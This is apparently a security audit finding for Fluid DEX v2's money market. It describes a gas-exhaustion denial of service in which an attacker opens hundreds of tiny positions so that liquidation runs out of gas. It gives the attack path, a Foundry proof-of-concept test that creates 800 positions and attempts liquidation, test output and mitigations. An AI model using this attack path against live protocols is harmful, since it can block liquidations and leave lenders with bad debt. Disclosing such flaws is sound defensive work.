# S-1 Unbounded Position Loop in _getHfInfo Allows Permanent DoS of Liquidation Mechanism

## Summary
`_getHfInfo` function iterates over all positions of an NFT (up to 1023). Each D3/D4 position in the loop triggers multiple cross-contract calls (Oracle, Liquidity Layer, DEX V2), making the total gas consumption very high (may exceed block gas limit ) for maximally populated NFTs. An attacker can create an NFT with many small positions near a liquidation threshold, making it permanently impossible to liquidate, while interest accrues on the locked debt.

## Root Cause
In `_getHfInfo` function :
https://github.com/sherlock-audit/2026-01-fluid-dex-v2/blob/main/fluid-contracts/contracts/protocols/moneyMarket/core/other/helpers.sol#L774C1-L810C22

```solidity
function _getHfInfo(uint256 nftId_, bool isOperate_) internal returns (HfInfo memory hfInfo_) {  
    // ...  
    uint256 v_.numberOfPositions = (nftConfig_ >> MSL.BITS_NFT_CONFIGS_NUMBER_OF_POSITIONS) & X10;  
    // X10 = 0x3FF = 1023 max  
      
    for (uint256 i_ = 1; i_ <= v_.numberOfPositions; i_++) {  
        uint256 positionData_ = _positionData[nftId_][i_];  
        uint256 positionType_ = (positionData_ >> ...) & X5;  
          
        // For D3/D4 positions, each iteration calls:  
        // 1. _getExchangePrices(token0_)    → external call to Liquidity Layer  
        // 2. _getExchangePrices(token1_)    → external call to Liquidity Layer  
        // 3. _getPrice(oracle_, token0_, ...)   → external call to Oracle  
        // 4. _getPrice(oracle_, token1_, ...)   → external call to Oracle  
        // 5. _getDexV2DexVariables(...)  → DEX_V2.readFromStorage(...)  
        // 6. _getDexV2PositionData(...)  → DEX_V2.readFromStorage() × 3  
        // 7. _getDexV2TickFeeGrowthOutside() × 2  → DEX_V2.readFromStorage() × 4  
    }  
}  
```

For 1023 D3/D4 positions:

External calls to Liquidity Layer: `1023 × 2 = 2046` (exchange prices for 2 tokens)
External calls to Oracle: `1023 × 2 = 2046`
Cross-contract storage reads via DEX_V2: `1023 × (1 + 3 + 4) = 8184`
Approximate gas per cross-contract access: `~2800 gas`

Estimated total gas:
```
(2046 + 2046) × 2800 + 8184 × 2800 ≈ 34.3M gas  
```
This may approach block gas limit in worst-case scenarios.
moreover , The `_getHfInfo` function is called by:

- `_checkHf()` → called after every operate (supply, borrow, withdraw, payback)
- `liquidate()` → called at start AND end of every liquidation
Thus , Liquidation becomes practically non-executable.


## Internal Preconditions

-   NFT supports up to 1023 positions (as per bitmask design).
-   `_getHfInfo` must iterate all positions.
-   Each D3/D4 position requires multiple external reads.

## External Preconditions

-   Attacker can open many small D3/D4 positions (minimum amounts
    permitted).
-   The NFT approaches or falls below liquidation threshold.
-   A liquidator attempts to call `liquidate()`.


## Attack Path

1.  Attacker opens NFT with:

    -   1 large supply position
    -   1 debt position

2.  Attacker incrementally adds up to 1023 D3/D4 positions using minimal
    valid amounts.

3.  NFT reaches maximum allowed position count.

4.  Debt accrues until HF \< 1.

5.  Liquidator calls `liquidate()`.

6.  `_getHfInfo` iterates through all 1023 positions.

7.  Gas consumption approaches or exceeds block gas limit.

8.  Transaction reverts due to out-of-gas.

Liquidation is blocked.

Debt continues accruing.


## Impact

-   **Liquidation blockage under maximal position configuration**
-   Debt continues accruing while liquidation fails
-   Potential accumulation of bad debt
-   NFT becomes functionally frozen in stressed state
-   Systemic risk if repeated across multiple NFTs

This directly disfavors liquidation and undermines the protocol's core
risk control mechanism.

## POC 

The PoC demonstrates -
- An attacker can create hundreds of D4 positions under a single NFT.
- Liquidation calls `_getHfInfo()`, which loops over all positions of that NFT.
- Liquidation gas cost therefore grows linearly with position count.
- With large numbers of positions, liquidation consumes extreme gas and reverts before completion.
- Under real block gas limits, the position becomes effectively `unliquidatable`.

**This enables a gas-based liquidation DoS, allowing undercollateralized debt to persist.**

- Paste the following code at `fluid-contracts/test/foundry/moneyMarket/main.sol`
```solidity

function test_LiquidationDoS() public {
    _listUSDC();
    D3D4TestVars memory vars = _setupD4Pool();

    vm.startPrank(admin);

    (bool success,) = address(moneyMarket).call(
        abi.encodeWithSelector(
            moneyMarketAdminModule.updateMaxPositionsPerNFT.selector,
            1023
        )
    );
    require(success);

    (success,) = address(moneyMarket).call(
        abi.encodeWithSelector(
            moneyMarketAdminModule.updateMinNormalizedCollateralValue.selector,
            0
        )
    );
    require(success);

    vm.stopPrank();

    bytes memory supplyData = abi.encode(
        1,
        2,
        5000 * 1e6
    );

    (uint256 nftId,) = moneyMarket.operate(0, 0, supplyData);

    console2.log("NFT ID:", nftId);
    console2.log("Creating 800 D4 positions...");

    for (uint256 i = 0; i < 800; i++) {
        int24 tickShift = int24(int256(i));

        CreateD3D4PositionParams memory p = CreateD3D4PositionParams({
            token0Index: 2,
            token1Index: 1,
            tickSpacing: 1,
            fee: 100,
            controller: address(0),
            tickLower: vars.positionTickLower - tickShift,
            tickUpper: vars.positionTickUpper + tickShift,
            amount0: 1e6,
            amount1: 1e14,
            amount0Min: 0,
            amount1Min: 0,
            to: address(this)
        });

        bytes memory actionData = abi.encode(4, p);
        moneyMarket.operate{value: p.amount1}(nftId, 0, actionData);
    }

    console2.log("D4 positions created: 800");

    CreateD3D4PositionParams memory largeDebt = CreateD3D4PositionParams({
        token0Index: 2,
        token1Index: 1,
        tickSpacing: 1,
        fee: 100,
        controller: address(0),
        tickLower: vars.positionTickLower + int24(900),
        tickUpper: vars.positionTickUpper + int24(900),
        amount0: 400 * 1e6,
        amount1: 0.1 ether,
        amount0Min: 0,
        amount1Min: 0,
        to: address(this)
    });

    bytes memory debtAction = abi.encode(4, largeDebt);
    (, uint256 debtIndex) = moneyMarket.operate{value: largeDebt.amount1}(nftId, 0, debtAction);

    console2.log("Debt position index:", debtIndex);

    _changeOraclePrice(NATIVE_TOKEN_ADDRESS, 13000 * 1e18);
    USDC.approve(address(moneyMarket), type(uint256).max);

    console2.log("Attempting liquidation...");

    uint256 gasBefore = gasleft();

    try moneyMarket.liquidate{value: 0.04 ether}(
        LiquidateParams({
            nftId: nftId,
            paybackPositionIndex: debtIndex,
            withdrawPositionIndex: 1,
            to: address(this),
            estimate: false,
            paybackData: abi.encode(
                uint256(200 * 1e6),
                uint256(0.04 ether),
                uint256(0),
                uint256(0)
            )
        })
    ) {
        console2.log("Liquidation: SUCCESS");
    } catch {
    uint256 gasUsed = gasBefore - gasleft();
    console2.log("Liquidation Gas Used:", gasUsed);
    console2.log("Liquidation: REVERTED");
    }

}

```
- Output 
```solidity
Ran 1 test for test/foundry/moneyMarket/main.sol:MoneyMarketTest
[PASS] test_LiquidationDoS() (gas: 17559834587)
Logs:
  Running LiquidityBaseTest with mainnet resolver and modules
  Token0 (USDC):          0xA4AD4f68d0b91CFD19687c881e50f3A00242828c
  Token1 (ETH):           0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE
  Fee:                    100 (0.01%)
  Tick Spacing:           1
  Controller:             0x0000000000000000000000000000000000000000
  SqrtPriceX96:           1252707241875239655932068989
  Current Tick:           -82945
  Creating 800 D4 positions...
  D4 positions created: 800
  Attempting liquidation...
  Liquidation: REVERTED
```

## Mitigation
- Reduce Maximum Positions
```solidity
uint256 internal constant SAFE_MAX_POSITIONS = 20;  
```
Cap positions at a safe value that ensures liquidation remains
executable.

- Gas Guard Inside Loop
```solidity
if (gasleft() < MIN_GAS_THRESHOLD) revert();  
```
Prevents guaranteed OOG execution.